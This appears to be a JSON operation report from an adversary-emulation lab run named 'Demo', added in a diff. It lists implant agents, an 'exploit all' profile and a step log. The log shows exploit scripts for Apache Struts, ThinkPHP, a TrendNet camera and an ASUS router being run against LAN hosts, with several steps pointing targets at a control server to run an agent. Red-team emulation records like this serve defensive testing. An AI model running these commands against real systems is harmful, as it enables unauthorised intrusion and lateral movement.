@@ -1,0 +1,719 @@
+{
+    "name": "Demo",
+    "id": 1,
+    "host_group": [
+        {
+            "id": 1,
+            "paw": "kali$root",
+            "last_seen": "2019-10-27 15:28:52",
+            "architecture": "amd64",
+            "platform": "linux",
+            "server": "http://192.168.1.51:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-linux",
+            "pid": 15569,
+            "ppid": 13192,
+            "trusted": 1,
+            "last_trusted_seen": "2019-10-27 15:28:52",
+            "sleep_min": 60,
+            "sleep_max": 60,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ]
+        },
+        {
+            "id": 2,
+            "paw": "apacheStruts$tomcat",
+            "last_seen": "2019-10-27 15:28:21",
+            "architecture": "arm",
+            "platform": "linux",
+            "server": "http://192.168.1.51:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-arm",
+            "pid": 715,
+            "ppid": 449,
+            "trusted": 1,
+            "last_trusted_seen": "2019-10-27 15:28:21",
+            "sleep_min": 60,
+            "sleep_max": 60,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_arm",
+                    "preferred": 0
+                }
+            ]
+        },
+        {
+            "id": 3,
+            "paw": "thinkPHP$www-data",
+            "last_seen": "2019-10-27 15:28:52",
+            "architecture": "arm",
+            "platform": "linux",
+            "server": "http://192.168.1.51:8888",
+            "host_group": "my_group",
+            "location": "/tmp/sandcat-arm",
+            "pid": 2403,
+            "ppid": 2375,
+            "trusted": 1,
+            "last_trusted_seen": "2019-10-27 15:28:52",
+            "sleep_min": 60,
+            "sleep_max": 60,
+            "executors": [
+                {
+                    "executor": "sh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_arm",
+                    "preferred": 0
+                }
+            ]
+        }
+    ],
+    "start": "2019-10-27 15:26:25",
+    "facts": [
+        {
+            "id": 5,
+            "property": "remote.host.ip",
+            "value": "192.168.1.1",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 6,
+            "property": "remote.host.ip",
+            "value": "192.168.1.24",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 7,
+            "property": "remote.host.ip",
+            "value": "192.168.1.59",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        },
+        {
+            "id": 8,
+            "property": "remote.host.ip",
+            "value": "192.168.1.250",
+            "score": 9,
+            "set_id": 0,
+            "source_id": "1",
+            "link_id": null
+        }
+    ],
+    "finish": "2019-10-27 15:28:52",
+    "planner": {
+        "id": 1,
+        "name": "sequential",
+        "module": "plugins.stockpile.app.sequential",
+        "params": {}
+    },
+    "adversary": {
+        "id": 10,
+        "adversary_id": "e58f9064-0675-4d03-8c34-15612d61ccfc",
+        "name": "exploit all",
+        "description": "exploit all custom exploits",
+        "phases": {
+            "1": [
+                {
+                    "id": 148,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 148,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 56
+                },
+                {
+                    "id": 147,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 147,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 56
+                },
+                {
+                    "id": 150,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 150,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 56
+                },
+                {
+                    "id": 149,
+                    "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit TrendNet IP Camera",
+                    "test": "cHl0aG9uMyB0cmVuZG5ldC1leHBsb2l0LnB5IC0tdGFyZ2V0ICN7cmVtb3RlLmhvc3QuaXB9",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 149,
+                            "payload": "trendnet-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 56
+                },
+                {
+                    "id": 136,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 136,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 55
+                },
+                {
+                    "id": 135,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 135,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 55
+                },
+                {
+                    "id": 138,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 138,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 55
+                },
+                {
+                    "id": 137,
+                    "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ThinkPHP",
+                    "test": "cHl0aG9uMyB0aGlua3BocC1leHBsb2l0LnB5IC1pICN7cmVtb3RlLmhvc3QuaXB9IC1zICN7c2VydmVyfQ==",
+                    "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 137,
+                            "payload": "thinkphp-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 55
+                },
+                {
+                    "id": 132,
+                    "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts",
+                    "test": "cHl0aG9uMyBzdHJ1dHMtZXhwbG9pdC5weSAje3JlbW90ZS5ob3N0LmlwfSAje3NlcnZlcn0=",
+                    "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 132,
+                            "payload": "struts-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 54
+                },
+                {
+                    "id": 131,
+                    "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts",
+                    "test": "cHl0aG9uMyBzdHJ1dHMtZXhwbG9pdC5weSAje3JlbW90ZS5ob3N0LmlwfSAje3NlcnZlcn0=",
+                    "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 131,
+                            "payload": "struts-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 54
+                },
+                {
+                    "id": 134,
+                    "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts",
+                    "test": "cHl0aG9uMyBzdHJ1dHMtZXhwbG9pdC5weSAje3JlbW90ZS5ob3N0LmlwfSAje3NlcnZlcn0=",
+                    "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 134,
+                            "payload": "struts-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 54
+                },
+                {
+                    "id": 133,
+                    "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit Apache Struts",
+                    "test": "cHl0aG9uMyBzdHJ1dHMtZXhwbG9pdC5weSAje3JlbW90ZS5ob3N0LmlwfSAje3NlcnZlcn0=",
+                    "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 133,
+                            "payload": "struts-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 54
+                },
+                {
+                    "id": 156,
+                    "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ASUS RT-N56U",
+                    "test": "cHl0aG9uMiBhc3VzLWV4cGxvaXQucHkgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "darwin",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 156,
+                            "payload": "asus-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 57
+                },
+                {
+                    "id": 155,
+                    "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ASUS RT-N56U",
+                    "test": "cHl0aG9uMiBhc3VzLWV4cGxvaXQucHkgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+                    "cleanup": "",
+                    "executor": "sh",
+                    "platform": "linux",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 155,
+                            "payload": "asus-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 57
+                },
+                {
+                    "id": 158,
+                    "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ASUS RT-N56U",
+                    "test": "cHl0aG9uMiBhc3VzLWV4cGxvaXQucHkgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+                    "cleanup": "",
+                    "executor": "cmd",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 158,
+                            "payload": "asus-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 57
+                },
+                {
+                    "id": 157,
+                    "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+                    "tactic": "lateral-movement",
+                    "technique_name": "Exploitation of Remote Services",
+                    "technique_id": "T1210",
+                    "name": "Exploit ASUS RT-N56U",
+                    "test": "cHl0aG9uMiBhc3VzLWV4cGxvaXQucHkgLS10YXJnZXQgI3tyZW1vdGUuaG9zdC5pcH0=",
+                    "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+                    "cleanup": "",
+                    "executor": "psh",
+                    "platform": "windows",
+                    "parser": [],
+                    "payload": [
+                        {
+                            "ability": 157,
+                            "payload": "asus-exploit.py"
+                        }
+                    ],
+                    "adversary_map_id": 57
+                }
+            ]
+        }
+    },
+    "jitter": "4/8",
+    "steps": [
+        {
+            "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+            "paw": "kali$root",
+            "command": "python3 struts-exploit.py 192.168.1.1 http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.629724",
+            "run": "2019-10-27 15:27:13",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+            "name": "Exploit Apache Struts",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+            "paw": "kali$root",
+            "command": "python3 struts-exploit.py 192.168.1.24 http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.630197",
+            "run": "2019-10-27 15:27:23",
+            "status": 0,
+            "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+            "name": "Exploit Apache Struts",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+            "paw": "kali$root",
+            "command": "python3 struts-exploit.py 192.168.1.59 http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.630503",
+            "run": "2019-10-27 15:27:25",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+            "name": "Exploit Apache Struts",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "b4e1f059-7408-44d5-8c38-74acc95463e5",
+            "paw": "kali$root",
+            "command": "python3 struts-exploit.py 192.168.1.250 http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.630761",
+            "run": "2019-10-27 15:27:31",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in Apache Struts to run Sandcat on a remote server",
+            "name": "Exploit Apache Struts",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "kali$root",
+            "command": "python3 thinkphp-exploit.py -i 192.168.1.1 -s http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.630869",
+            "run": "2019-10-27 15:27:37",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "kali$root",
+            "command": "python3 thinkphp-exploit.py -i 192.168.1.24 -s http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.630972",
+            "run": "2019-10-27 15:27:42",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "kali$root",
+            "command": "python3 thinkphp-exploit.py -i 192.168.1.59 -s http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.631072",
+            "run": "2019-10-27 15:27:50",
+            "status": 0,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "a5e34950-0687-4dae-b090-4a835e01c68d",
+            "paw": "kali$root",
+            "command": "python3 thinkphp-exploit.py -i 192.168.1.250 -s http://192.168.1.51:8888",
+            "delegated": "2019-10-27 15:27:13.631170",
+            "run": "2019-10-27 15:27:52",
+            "status": 1,
+            "description": "Takes advantage of an RCE Vuln in ThinkPHP to run Sandcat on a remote server",
+            "name": "Exploit ThinkPHP",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+            "paw": "kali$root",
+            "command": "python3 trendnet-exploit.py --target 192.168.1.1",
+            "delegated": "2019-10-27 15:27:13.631270",
+            "run": "2019-10-27 15:27:57",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+            "name": "Exploit TrendNet IP Camera",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+            "paw": "kali$root",
+            "command": "python3 trendnet-exploit.py --target 192.168.1.24",
+            "delegated": "2019-10-27 15:27:13.631408",
+            "run": "2019-10-27 15:28:04",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+            "name": "Exploit TrendNet IP Camera",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+            "paw": "kali$root",
+            "command": "python3 trendnet-exploit.py --target 192.168.1.59",
+            "delegated": "2019-10-27 15:27:13.631561",
+            "run": "2019-10-27 15:28:11",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+            "name": "Exploit TrendNet IP Camera",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "0f149071-3772-46a7-9d44-0391411e381a",
+            "paw": "kali$root",
+            "command": "python3 trendnet-exploit.py --target 192.168.1.250",
+            "delegated": "2019-10-27 15:27:13.631711",
+            "run": "2019-10-27 15:28:19",
+            "status": 0,
+            "description": "Takes advantage of an Authenticated RCE Vuln in the TrendNet TV-IP410W Camera",
+            "name": "Exploit TrendNet IP Camera",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+            "paw": "kali$root",
+            "command": "python2 asus-exploit.py --target 192.168.1.1",
+            "delegated": "2019-10-27 15:27:13.631819",
+            "run": "2019-10-27 15:28:39",
+            "status": 0,
+            "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+            "name": "Exploit ASUS RT-N56U",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+            "paw": "kali$root",
+            "command": "python2 asus-exploit.py --target 192.168.1.24",
+            "delegated": "2019-10-27 15:27:13.631918",
+            "run": "2019-10-27 15:28:45",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+            "name": "Exploit ASUS RT-N56U",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+            "paw": "kali$root",
+            "command": "python2 asus-exploit.py --target 192.168.1.59",
+            "delegated": "2019-10-27 15:27:13.632031",
+            "run": "2019-10-27 15:28:49",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+            "name": "Exploit ASUS RT-N56U",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        },
+        {
+            "ability_id": "c6e0a60e-941b-4293-bb5e-815457f738da",
+            "paw": "kali$root",
+            "command": "python2 asus-exploit.py --target 192.168.1.250",
+            "delegated": "2019-10-27 15:27:13.632129",
+            "run": "2019-10-27 15:28:52",
+            "status": 1,
+            "description": "Takes advantage of an Authenticated RCE Vuln in ASUS RT-N56U to determine vulnerability status",
+            "name": "Exploit ASUS RT-N56U",
+            "attack": {
+                "tactic": "lateral-movement",
+                "technique_name": "Exploitation of Remote Services",
+                "technique_id": "T1210"
+            }
+        }
+    ]
+}
